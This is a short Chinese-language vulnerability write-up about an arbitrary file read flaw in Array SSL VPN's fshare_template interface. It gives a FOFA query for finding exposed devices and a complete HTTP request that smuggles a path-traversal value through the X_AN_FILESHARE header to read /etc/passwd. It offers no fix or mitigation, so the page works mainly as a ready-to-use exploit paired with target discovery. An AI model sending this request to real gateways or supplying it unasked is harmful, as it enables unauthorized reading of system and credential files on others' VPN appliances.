# Array VPN存在任意文件读取漏洞

# 一、漏洞简介
Array SSL VPN远程安全接入软件具备远程安全接入网关的全部功能，可以在虚拟化或云环境中提供专业的远程安全访问；它帮助用户实现在任何时间任何地点使用任何设备都可以安全地连接到云上的主机或应用。Array的 fshare_template 接口存在任意文件读取漏洞

# 二、影响版本
+ Array VPN

# 三、资产测绘
+ fofa`product="Array-VPN"`
+ 特征

![1725779477080-0973a873-2c5d-4d34-a754-45b9db9c8553.png](./img/A05OLfyJgWII4Te6/1725779477080-0973a873-2c5d-4d34-a754-45b9db9c8553-671397.png)

# 四、漏洞复现
```java
GET /prx/000/http/localhost/client_sec/%00../../../addfolder HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X_AN_FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd
Dnt: 1
Upgrade-Insecure-Requests: 1
Connection: close
```

![1725779502203-97c419b2-7ba4-4ac3-b00d-d3586b64031e.png](./img/A05OLfyJgWII4Te6/1725779502203-97c419b2-7ba4-4ac3-b00d-d3586b64031e-922332.png)

![1725779512607-983887f4-4a8a-4777-a2f4-359819387b3b.png](./img/A05OLfyJgWII4Te6/1725779512607-983887f4-4a8a-4777-a2f4-359819387b3b-741809.png)



> 更新: 2024-10-22 09:40:55  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gxbmavs2hmreimvi>